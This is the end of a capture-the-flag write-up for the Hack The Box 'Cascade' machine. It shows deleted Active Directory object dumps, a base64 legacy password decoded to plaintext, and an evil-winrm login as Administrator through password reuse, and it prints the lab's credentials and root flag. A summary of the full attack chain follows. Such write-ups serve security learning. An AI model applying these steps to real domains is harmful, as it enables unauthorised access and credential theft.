</span><span id="__span-68-149"><a id="__codelineno-68-149" name="__codelineno-68-149" href="#__codelineno-68-149"></a>Deleted<span class="w">                         </span>:<span class="w"> </span>True
</span><span id="__span-68-150"><a id="__codelineno-68-150" name="__codelineno-68-150" href="#__codelineno-68-150"></a>Description<span class="w">                     </span>:
</span><span id="__span-68-151"><a id="__codelineno-68-151" name="__codelineno-68-151" href="#__codelineno-68-151"></a>DisplayName<span class="w">                     </span>:
</span><span id="__span-68-152"><a id="__codelineno-68-152" name="__codelineno-68-152" href="#__codelineno-68-152"></a>DistinguishedName<span class="w">               </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Machine<span class="se">\0</span>ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN<span class="o">=</span>Deleted<span class="w"> </span>Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-68-153"><a id="__codelineno-68-153" name="__codelineno-68-153" href="#__codelineno-68-153"></a>dSCorePropagationData<span class="w">           </span>:<span class="w"> </span><span class="o">{</span><span class="m">1</span>/1/1601<span class="w"> </span><span class="m">12</span>:00:00<span class="w"> </span>AM<span class="o">}</span>
</span><span id="__span-68-154"><a id="__codelineno-68-154" name="__codelineno-68-154" href="#__codelineno-68-154"></a>instanceType<span class="w">                    </span>:<span class="w"> </span><span class="m">4</span>
</span><span id="__span-68-155"><a id="__codelineno-68-155" name="__codelineno-68-155" href="#__codelineno-68-155"></a>isDeleted<span class="w">                       </span>:<span class="w"> </span>True
</span><span id="__span-68-156"><a id="__codelineno-68-156" name="__codelineno-68-156" href="#__codelineno-68-156"></a>LastKnownParent<span class="w">                 </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">={</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span><span class="se">\0</span>ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN<span class="o">=</span>Deleted<span class="w"> </span>Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-68-157"><a id="__codelineno-68-157" name="__codelineno-68-157" href="#__codelineno-68-157"></a>Modified<span class="w">                        </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:40:52<span class="w"> </span>AM
</span><span id="__span-68-158"><a id="__codelineno-68-158" name="__codelineno-68-158" href="#__codelineno-68-158"></a>modifyTimeStamp<span class="w">                 </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:40:52<span class="w"> </span>AM
</span><span id="__span-68-159"><a id="__codelineno-68-159" name="__codelineno-68-159" href="#__codelineno-68-159"></a>msDS-LastKnownRDN<span class="w">               </span>:<span class="w"> </span>Machine
</span><span id="__span-68-160"><a id="__codelineno-68-160" name="__codelineno-68-160" href="#__codelineno-68-160"></a>Name<span class="w">                            </span>:<span class="w"> </span>Machine
</span><span id="__span-68-161"><a id="__codelineno-68-161" name="__codelineno-68-161" href="#__codelineno-68-161"></a><span class="w">                                  </span>DEL:93c23674-e411-400b-bb9f-c0340bda5a34
</span><span id="__span-68-162"><a id="__codelineno-68-162" name="__codelineno-68-162" href="#__codelineno-68-162"></a>nTSecurityDescriptor<span class="w">            </span>:<span class="w"> </span>System.DirectoryServices.ActiveDirectorySecurity
</span><span id="__span-68-163"><a id="__codelineno-68-163" name="__codelineno-68-163" href="#__codelineno-68-163"></a>ObjectCategory<span class="w">                  </span>:
</span><span id="__span-68-164"><a id="__codelineno-68-164" name="__codelineno-68-164" href="#__codelineno-68-164"></a>ObjectClass<span class="w">                     </span>:<span class="w"> </span>container
</span><span id="__span-68-165"><a id="__codelineno-68-165" name="__codelineno-68-165" href="#__codelineno-68-165"></a>ObjectGUID<span class="w">                      </span>:<span class="w"> </span>93c23674-e411-400b-bb9f-c0340bda5a34
</span><span id="__span-68-166"><a id="__codelineno-68-166" name="__codelineno-68-166" href="#__codelineno-68-166"></a>ProtectedFromAccidentalDeletion<span class="w"> </span>:<span class="w"> </span>False
</span><span id="__span-68-167"><a id="__codelineno-68-167" name="__codelineno-68-167" href="#__codelineno-68-167"></a>sDRightsEffective<span class="w">               </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-168"><a id="__codelineno-68-168" name="__codelineno-68-168" href="#__codelineno-68-168"></a>showInAdvancedViewOnly<span class="w">          </span>:<span class="w"> </span>True
</span><span id="__span-68-169"><a id="__codelineno-68-169" name="__codelineno-68-169" href="#__codelineno-68-169"></a>uSNChanged<span class="w">                      </span>:<span class="w"> </span><span class="m">196699</span>
</span><span id="__span-68-170"><a id="__codelineno-68-170" name="__codelineno-68-170" href="#__codelineno-68-170"></a>uSNCreated<span class="w">                      </span>:<span class="w"> </span><span class="m">196689</span>
</span><span id="__span-68-171"><a id="__codelineno-68-171" name="__codelineno-68-171" href="#__codelineno-68-171"></a>whenChanged<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:40:52<span class="w"> </span>AM
</span><span id="__span-68-172"><a id="__codelineno-68-172" name="__codelineno-68-172" href="#__codelineno-68-172"></a>whenCreated<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:34:31<span class="w"> </span>AM
</span><span id="__span-68-173"><a id="__codelineno-68-173" name="__codelineno-68-173" href="#__codelineno-68-173"></a>
</span><span id="__span-68-174"><a id="__codelineno-68-174" name="__codelineno-68-174" href="#__codelineno-68-174"></a>CanonicalName<span class="w">                   </span>:<span class="w"> </span>cascade.local/Deleted<span class="w"> </span>Objects/User
</span><span id="__span-68-175"><a id="__codelineno-68-175" name="__codelineno-68-175" href="#__codelineno-68-175"></a><span class="w">                                  </span>DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
</span><span id="__span-68-176"><a id="__codelineno-68-176" name="__codelineno-68-176" href="#__codelineno-68-176"></a>CN<span class="w">                              </span>:<span class="w"> </span>User
</span><span id="__span-68-177"><a id="__codelineno-68-177" name="__codelineno-68-177" href="#__codelineno-68-177"></a><span class="w">                                  </span>DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
</span><span id="__span-68-178"><a id="__codelineno-68-178" name="__codelineno-68-178" href="#__codelineno-68-178"></a>Created<span class="w">                         </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:34:31<span class="w"> </span>AM
</span><span id="__span-68-179"><a id="__codelineno-68-179" name="__codelineno-68-179" href="#__codelineno-68-179"></a>createTimeStamp<span class="w">                 </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:34:31<span class="w"> </span>AM
</span><span id="__span-68-180"><a id="__codelineno-68-180" name="__codelineno-68-180" href="#__codelineno-68-180"></a>Deleted<span class="w">                         </span>:<span class="w"> </span>True
</span><span id="__span-68-181"><a id="__codelineno-68-181" name="__codelineno-68-181" href="#__codelineno-68-181"></a>Description<span class="w">                     </span>:
</span><span id="__span-68-182"><a id="__codelineno-68-182" name="__codelineno-68-182" href="#__codelineno-68-182"></a>DisplayName<span class="w">                     </span>:
</span><span id="__span-68-183"><a id="__codelineno-68-183" name="__codelineno-68-183" href="#__codelineno-68-183"></a>DistinguishedName<span class="w">               </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>User<span class="se">\0</span>ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN<span class="o">=</span>Deleted<span class="w"> </span>Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-68-184"><a id="__codelineno-68-184" name="__codelineno-68-184" href="#__codelineno-68-184"></a>dSCorePropagationData<span class="w">           </span>:<span class="w"> </span><span class="o">{</span><span class="m">1</span>/1/1601<span class="w"> </span><span class="m">12</span>:00:00<span class="w"> </span>AM<span class="o">}</span>
</span><span id="__span-68-185"><a id="__codelineno-68-185" name="__codelineno-68-185" href="#__codelineno-68-185"></a>instanceType<span class="w">                    </span>:<span class="w"> </span><span class="m">4</span>
</span><span id="__span-68-186"><a id="__codelineno-68-186" name="__codelineno-68-186" href="#__codelineno-68-186"></a>isDeleted<span class="w">                       </span>:<span class="w"> </span>True
</span><span id="__span-68-187"><a id="__codelineno-68-187" name="__codelineno-68-187" href="#__codelineno-68-187"></a>LastKnownParent<span class="w">                 </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">={</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span><span class="se">\0</span>ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN<span class="o">=</span>Deleted<span class="w"> </span>Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-68-188"><a id="__codelineno-68-188" name="__codelineno-68-188" href="#__codelineno-68-188"></a>Modified<span class="w">                        </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:40:52<span class="w"> </span>AM
</span><span id="__span-68-189"><a id="__codelineno-68-189" name="__codelineno-68-189" href="#__codelineno-68-189"></a>modifyTimeStamp<span class="w">                 </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:40:52<span class="w"> </span>AM
</span><span id="__span-68-190"><a id="__codelineno-68-190" name="__codelineno-68-190" href="#__codelineno-68-190"></a>msDS-LastKnownRDN<span class="w">               </span>:<span class="w"> </span>User
</span><span id="__span-68-191"><a id="__codelineno-68-191" name="__codelineno-68-191" href="#__codelineno-68-191"></a>Name<span class="w">                            </span>:<span class="w"> </span>User
</span><span id="__span-68-192"><a id="__codelineno-68-192" name="__codelineno-68-192" href="#__codelineno-68-192"></a><span class="w">                                  </span>DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
</span><span id="__span-68-193"><a id="__codelineno-68-193" name="__codelineno-68-193" href="#__codelineno-68-193"></a>nTSecurityDescriptor<span class="w">            </span>:<span class="w"> </span>System.DirectoryServices.ActiveDirectorySecurity
</span><span id="__span-68-194"><a id="__codelineno-68-194" name="__codelineno-68-194" href="#__codelineno-68-194"></a>ObjectCategory<span class="w">                  </span>:
</span><span id="__span-68-195"><a id="__codelineno-68-195" name="__codelineno-68-195" href="#__codelineno-68-195"></a>ObjectClass<span class="w">                     </span>:<span class="w"> </span>container
</span><span id="__span-68-196"><a id="__codelineno-68-196" name="__codelineno-68-196" href="#__codelineno-68-196"></a>ObjectGUID<span class="w">                      </span>:<span class="w"> </span>746385f2-e3a0-4252-b83a-5a206da0ed88
</span><span id="__span-68-197"><a id="__codelineno-68-197" name="__codelineno-68-197" href="#__codelineno-68-197"></a>ProtectedFromAccidentalDeletion<span class="w"> </span>:<span class="w"> </span>False
</span><span id="__span-68-198"><a id="__codelineno-68-198" name="__codelineno-68-198" href="#__codelineno-68-198"></a>sDRightsEffective<span class="w">               </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-199"><a id="__codelineno-68-199" name="__codelineno-68-199" href="#__codelineno-68-199"></a>showInAdvancedViewOnly<span class="w">          </span>:<span class="w"> </span>True
</span><span id="__span-68-200"><a id="__codelineno-68-200" name="__codelineno-68-200" href="#__codelineno-68-200"></a>uSNChanged<span class="w">                      </span>:<span class="w"> </span><span class="m">196700</span>
</span><span id="__span-68-201"><a id="__codelineno-68-201" name="__codelineno-68-201" href="#__codelineno-68-201"></a>uSNCreated<span class="w">                      </span>:<span class="w"> </span><span class="m">196690</span>
</span><span id="__span-68-202"><a id="__codelineno-68-202" name="__codelineno-68-202" href="#__codelineno-68-202"></a>whenChanged<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:40:52<span class="w"> </span>AM
</span><span id="__span-68-203"><a id="__codelineno-68-203" name="__codelineno-68-203" href="#__codelineno-68-203"></a>whenCreated<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>/26/2020<span class="w"> </span><span class="m">2</span>:34:31<span class="w"> </span>AM
</span><span id="__span-68-204"><a id="__codelineno-68-204" name="__codelineno-68-204" href="#__codelineno-68-204"></a>
</span><span id="__span-68-205"><a id="__codelineno-68-205" name="__codelineno-68-205" href="#__codelineno-68-205"></a>accountExpires<span class="w">                  </span>:<span class="w"> </span><span class="m">9223372036854775807</span>
</span><span id="__span-68-206"><a id="__codelineno-68-206" name="__codelineno-68-206" href="#__codelineno-68-206"></a>badPasswordTime<span class="w">                 </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-207"><a id="__codelineno-68-207" name="__codelineno-68-207" href="#__codelineno-68-207"></a>badPwdCount<span class="w">                     </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-208"><a id="__codelineno-68-208" name="__codelineno-68-208" href="#__codelineno-68-208"></a>CanonicalName<span class="w">                   </span>:<span class="w"> </span>cascade.local/Deleted<span class="w"> </span>Objects/TempAdmin
</span><span id="__span-68-209"><a id="__codelineno-68-209" name="__codelineno-68-209" href="#__codelineno-68-209"></a><span class="w">                                  </span>DEL:f0cc344d-31e0-4866-bceb-a842791ca059
</span><span id="__span-68-210"><a id="__codelineno-68-210" name="__codelineno-68-210" href="#__codelineno-68-210"></a>cascadeLegacyPwd<span class="w">                </span>:<span class="w"> </span>YmFDVDNyMWFOMDBkbGVz
</span><span id="__span-68-211"><a id="__codelineno-68-211" name="__codelineno-68-211" href="#__codelineno-68-211"></a>CN<span class="w">                              </span>:<span class="w"> </span>TempAdmin
</span><span id="__span-68-212"><a id="__codelineno-68-212" name="__codelineno-68-212" href="#__codelineno-68-212"></a><span class="w">                                  </span>DEL:f0cc344d-31e0-4866-bceb-a842791ca059
</span><span id="__span-68-213"><a id="__codelineno-68-213" name="__codelineno-68-213" href="#__codelineno-68-213"></a>codePage<span class="w">                        </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-214"><a id="__codelineno-68-214" name="__codelineno-68-214" href="#__codelineno-68-214"></a>countryCode<span class="w">                     </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-215"><a id="__codelineno-68-215" name="__codelineno-68-215" href="#__codelineno-68-215"></a>Created<span class="w">                         </span>:<span class="w"> </span><span class="m">1</span>/27/2020<span class="w"> </span><span class="m">3</span>:23:08<span class="w"> </span>AM
</span><span id="__span-68-216"><a id="__codelineno-68-216" name="__codelineno-68-216" href="#__codelineno-68-216"></a>createTimeStamp<span class="w">                 </span>:<span class="w"> </span><span class="m">1</span>/27/2020<span class="w"> </span><span class="m">3</span>:23:08<span class="w"> </span>AM
</span><span id="__span-68-217"><a id="__codelineno-68-217" name="__codelineno-68-217" href="#__codelineno-68-217"></a>Deleted<span class="w">                         </span>:<span class="w"> </span>True
</span><span id="__span-68-218"><a id="__codelineno-68-218" name="__codelineno-68-218" href="#__codelineno-68-218"></a>Description<span class="w">                     </span>:
</span><span id="__span-68-219"><a id="__codelineno-68-219" name="__codelineno-68-219" href="#__codelineno-68-219"></a>DisplayName<span class="w">                     </span>:<span class="w"> </span>TempAdmin
</span><span id="__span-68-220"><a id="__codelineno-68-220" name="__codelineno-68-220" href="#__codelineno-68-220"></a>DistinguishedName<span class="w">               </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>TempAdmin<span class="se">\0</span>ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN<span class="o">=</span>Deleted<span class="w"> </span>Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-68-221"><a id="__codelineno-68-221" name="__codelineno-68-221" href="#__codelineno-68-221"></a>dSCorePropagationData<span class="w">           </span>:<span class="w"> </span><span class="o">{</span><span class="m">1</span>/27/2020<span class="w"> </span><span class="m">3</span>:23:08<span class="w"> </span>AM,<span class="w"> </span><span class="m">1</span>/1/1601<span class="w"> </span><span class="m">12</span>:00:00<span class="w"> </span>AM<span class="o">}</span>
</span><span id="__span-68-222"><a id="__codelineno-68-222" name="__codelineno-68-222" href="#__codelineno-68-222"></a>givenName<span class="w">                       </span>:<span class="w"> </span>TempAdmin
</span><span id="__span-68-223"><a id="__codelineno-68-223" name="__codelineno-68-223" href="#__codelineno-68-223"></a>instanceType<span class="w">                    </span>:<span class="w"> </span><span class="m">4</span>
</span><span id="__span-68-224"><a id="__codelineno-68-224" name="__codelineno-68-224" href="#__codelineno-68-224"></a>isDeleted<span class="w">                       </span>:<span class="w"> </span>True
</span><span id="__span-68-225"><a id="__codelineno-68-225" name="__codelineno-68-225" href="#__codelineno-68-225"></a>LastKnownParent<span class="w">                 </span>:<span class="w"> </span><span class="nv">OU</span><span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-68-226"><a id="__codelineno-68-226" name="__codelineno-68-226" href="#__codelineno-68-226"></a>lastLogoff<span class="w">                      </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-227"><a id="__codelineno-68-227" name="__codelineno-68-227" href="#__codelineno-68-227"></a>lastLogon<span class="w">                       </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-228"><a id="__codelineno-68-228" name="__codelineno-68-228" href="#__codelineno-68-228"></a>logonCount<span class="w">                      </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-229"><a id="__codelineno-68-229" name="__codelineno-68-229" href="#__codelineno-68-229"></a>Modified<span class="w">                        </span>:<span class="w"> </span><span class="m">1</span>/27/2020<span class="w"> </span><span class="m">3</span>:24:34<span class="w"> </span>AM
</span><span id="__span-68-230"><a id="__codelineno-68-230" name="__codelineno-68-230" href="#__codelineno-68-230"></a>modifyTimeStamp<span class="w">                 </span>:<span class="w"> </span><span class="m">1</span>/27/2020<span class="w"> </span><span class="m">3</span>:24:34<span class="w"> </span>AM
</span><span id="__span-68-231"><a id="__codelineno-68-231" name="__codelineno-68-231" href="#__codelineno-68-231"></a>msDS-LastKnownRDN<span class="w">               </span>:<span class="w"> </span>TempAdmin
</span><span id="__span-68-232"><a id="__codelineno-68-232" name="__codelineno-68-232" href="#__codelineno-68-232"></a>Name<span class="w">                            </span>:<span class="w"> </span>TempAdmin
</span><span id="__span-68-233"><a id="__codelineno-68-233" name="__codelineno-68-233" href="#__codelineno-68-233"></a><span class="w">                                  </span>DEL:f0cc344d-31e0-4866-bceb-a842791ca059
</span><span id="__span-68-234"><a id="__codelineno-68-234" name="__codelineno-68-234" href="#__codelineno-68-234"></a>nTSecurityDescriptor<span class="w">            </span>:<span class="w"> </span>System.DirectoryServices.ActiveDirectorySecurity
</span><span id="__span-68-235"><a id="__codelineno-68-235" name="__codelineno-68-235" href="#__codelineno-68-235"></a>ObjectCategory<span class="w">                  </span>:
</span><span id="__span-68-236"><a id="__codelineno-68-236" name="__codelineno-68-236" href="#__codelineno-68-236"></a>ObjectClass<span class="w">                     </span>:<span class="w"> </span>user
</span><span id="__span-68-237"><a id="__codelineno-68-237" name="__codelineno-68-237" href="#__codelineno-68-237"></a>ObjectGUID<span class="w">                      </span>:<span class="w"> </span>f0cc344d-31e0-4866-bceb-a842791ca059
</span><span id="__span-68-238"><a id="__codelineno-68-238" name="__codelineno-68-238" href="#__codelineno-68-238"></a>objectSid<span class="w">                       </span>:<span class="w"> </span>S-1-5-21-3332504370-1206983947-1165150453-1136
</span><span id="__span-68-239"><a id="__codelineno-68-239" name="__codelineno-68-239" href="#__codelineno-68-239"></a>primaryGroupID<span class="w">                  </span>:<span class="w"> </span><span class="m">513</span>
</span><span id="__span-68-240"><a id="__codelineno-68-240" name="__codelineno-68-240" href="#__codelineno-68-240"></a>ProtectedFromAccidentalDeletion<span class="w"> </span>:<span class="w"> </span>False
</span><span id="__span-68-241"><a id="__codelineno-68-241" name="__codelineno-68-241" href="#__codelineno-68-241"></a>pwdLastSet<span class="w">                      </span>:<span class="w"> </span><span class="m">132245689883479503</span>
</span><span id="__span-68-242"><a id="__codelineno-68-242" name="__codelineno-68-242" href="#__codelineno-68-242"></a>sAMAccountName<span class="w">                  </span>:<span class="w"> </span>TempAdmin
</span><span id="__span-68-243"><a id="__codelineno-68-243" name="__codelineno-68-243" href="#__codelineno-68-243"></a>sDRightsEffective<span class="w">               </span>:<span class="w"> </span><span class="m">0</span>
</span><span id="__span-68-244"><a id="__codelineno-68-244" name="__codelineno-68-244" href="#__codelineno-68-244"></a>userAccountControl<span class="w">              </span>:<span class="w"> </span><span class="m">66048</span>
</span><span id="__span-68-245"><a id="__codelineno-68-245" name="__codelineno-68-245" href="#__codelineno-68-245"></a>userPrincipalName<span class="w">               </span>:<span class="w"> </span>TempAdmin@cascade.local
</span><span id="__span-68-246"><a id="__codelineno-68-246" name="__codelineno-68-246" href="#__codelineno-68-246"></a>uSNChanged<span class="w">                      </span>:<span class="w"> </span><span class="m">237705</span>
</span><span id="__span-68-247"><a id="__codelineno-68-247" name="__codelineno-68-247" href="#__codelineno-68-247"></a>uSNCreated<span class="w">                      </span>:<span class="w"> </span><span class="m">237695</span>
</span><span id="__span-68-248"><a id="__codelineno-68-248" name="__codelineno-68-248" href="#__codelineno-68-248"></a>whenChanged<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>/27/2020<span class="w"> </span><span class="m">3</span>:24:34<span class="w"> </span>AM
</span><span id="__span-68-249"><a id="__codelineno-68-249" name="__codelineno-68-249" href="#__codelineno-68-249"></a>whenCreated<span class="w">                     </span>:<span class="w"> </span><span class="m">1</span>/27/2020<span class="w"> </span><span class="m">3</span>:23:08<span class="w"> </span>AM
</span></code></pre></div><br />
what i found inside is a password, for the TempAdmin (if you remember from above, we have seen this username before)<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>CanonicalName<span class="w">                   </span>:<span class="w"> </span>cascade.local/Deleted<span class="w"> </span>Objects/TempAdmin<span class="w"> </span>DEL:f0cc344d-31e0-4866-bceb-a842791ca059
</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>cascadeLegacyPwd<span class="w">                </span>:<span class="w"> </span>YmFDVDNyMWFOMDBkbGVz
</span></code></pre></div><br />
lets decode the password:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;YmFDVDNyMWFOMDBkbGVz&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w">  </span>
</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>baCT3r1aN00dles
</span></code></pre></div><br />
Great! we have a new pass, for TempAdmin. <br />
We now have those creds:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>TempAdmin
</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>baCT3r1aN00dles
</span></code></pre></div></p>
<p>But.. WAIT! the <code>Meeting_Notes_June_2018.html</code> file earlier told us that:<br />
<code>Username is TempAdmin (password is the same as the normal admin account password).</code></p>
<p>So it actually gave away that <code>Administrator</code> has the same pass as <code>TempAdmin</code>! Ah the good old password reuse...</p>
<p>lets try logging in then as <code>Administrator</code> to check if this is indeed true.</p>
<h4 id="logging-in-as-administrator">Logging in as <code>Administrator</code></h4>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>cascade.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;Administrator&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;baCT3r1aN00dles&#39;</span>
</span></code></pre></div><br />
and grabbed the root flag!<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>0dafbc442394909a7f6ae72194593bc2
</span></code></pre></div></p>
<hr />
<h1 id="summary">Summary</h1>
<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading:</p>
<h4 id="reconnaissance_1">Reconnaissance</h4>
<ol>
<li>nmap scan -&gt; found multiple services to focus on, like <mark>RPC, SMB, LDAP</mark> </li>
<li><mark>RPC</mark> enumeration revealed domain users and groups</li>
<li><mark>SMB</mark> enumeration revealed domain users and groups too</li>
<li><mark>LDAP</mark> enumeration revealed base64 encrypted <mark>password</mark> for specific <mark>user</mark> (r.thompson), which was then decrypted to plaintext</li>
</ol>
<h4 id="foothold_1">Foothold</h4>
<ol>
<li>nxc usage revealed that found creds allowed access to SMB (user r.thompson)</li>
<li><mark>enumerated files and directories</mark> and <mark>found file with encrypted text</mark>, and a <code>hint</code> for later</li>
<li>found it was related to VNC , and by searching the web found a way to <mark>decrypt</mark> it to plaintext pass</li>
<li>nxc usage revealed that found creds allowed access to <mark>WIN-RM</mark> (user s.smith)</li>
<li>grabbed user flag</li>
</ol>
<h4 id="privesc_1">Privesc</h4>
<ol>
<li><mark>Group Membersip enumeration</mark> (user s.smith) reveled membership to <code>Audit Share</code> group</li>
<li><mark>Details for Audit Share group</mark> showed access to share containing multiple <mark>files</mark></li>
<li>These <mark>files</mark> contaned a database file, containing encrypted text, and also <code>.dll</code> and <code>.exe</code> files, with no obvious way of decrypting it, without more information.</li>
<li><mark>Debugging</mark> <code>.dll</code> and <code>.exe</code> gave away the encryption process and thus it was then reversed</li>
<li>The decrypted text was password for <mark>another user</mark> (ArkSvc)</li>
<li>Group Membersip enumeration (user ArkSvc) reveled membership to <code>AD Recycle Bin</code> group</li>
<li><mark>retrieved deleted objects</mark></li>
<li>those <mark>deleted objects</mark> contained base64 encrypted pass, which by decryption showed <mark>plaintext pass</mark> for a user (TempAdmin) that we had a <code>hint</code> earlier on in the foothold stage</li>
<li><mark>password reuse</mark> was indicated by the <code>hint</code> from the foothold stage, for the <code>Administrator</code></li>
<li>grabbed root flag</li>
</ol>
<hr />
<h1 id="sidenotes">Sidenotes</h1>
<p>Overall, the steps for achieving foothold were kinda easy and doable, the privesc part though required debugging and understanding the functionality of an app, and specifically it's encryption process. After the debugging part, the road to Administrator was protected by deleted objects in the recycle bin, as indicated by the latest compromised user's group membership. <br />
This machine deserves a place in my notes mostly for the recon phase, the enumeration through all stages, and for the recycle bin part. </p>
<p>You can also watch the whole process recorded (apart from the .dll and .exe debugging part) here:<br />
https://asciinema.org/a/lSU3r4wlR1L3bOrPhxrKXjngp</p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.sections", "navigation.tabs", "search.highlight", "toc.sticky", "toc.follow", "content.code.copy", "navigation.top", "navigation.external"], "search": "../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../assets/javascripts/bundle.92b07e13.min.js"></script>
      
        <script src="https://fastly.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
      
        <script src="https://fastly.jsdelivr.net/npm/echarts/dist/echarts.min.js"></script>
      
        <script src="../assets/javascripts/interactive_graph.js"></script>
      
        <script src="../assets/javascripts/obsidian_tags.js"></script>
      
    
  </body>
</html>